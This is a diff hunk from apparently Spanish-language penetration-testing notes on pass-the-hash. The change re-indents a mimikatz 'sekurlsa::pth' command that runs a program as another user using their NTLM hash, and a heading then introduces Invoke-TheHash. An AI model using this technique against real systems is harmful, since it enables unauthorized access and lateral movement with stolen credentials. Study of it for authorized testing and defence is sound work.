@@ -8,7 +8,7 @@ Requerimos:
 - User
 - Dominio
 
-  mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<dominio o nombre del host> /run:<.exe a ejecutar>" exit
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<dominio o nombre del host> /run:<.exe a ejecutar>" exit
 
 ##### PTH con Powershell & Invoke-TheHash:
 Target - Hostname or IP address of the target.
